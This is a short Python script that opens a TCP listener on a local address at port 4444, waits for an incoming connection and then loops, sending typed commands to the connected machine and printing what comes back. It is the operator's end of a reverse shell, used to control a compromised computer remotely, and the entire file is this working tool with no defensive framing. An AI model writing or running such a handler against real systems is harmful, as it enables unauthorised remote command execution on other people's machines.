import socket #used to establish connection between two computers

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.bind(("192.168.1.23",4444))
listener.listen()
print("Listener has started")
connection, address = listener.accept()
print("[+] GOT CONNECTION")

while True:
    commands = input("Enter your cmd > ")
    commands = bytes(commands,'utf-8')
    connection.send(commands)
    output = connection.recv(9999999)
    output = output.decode('utf-8')
    print(output)
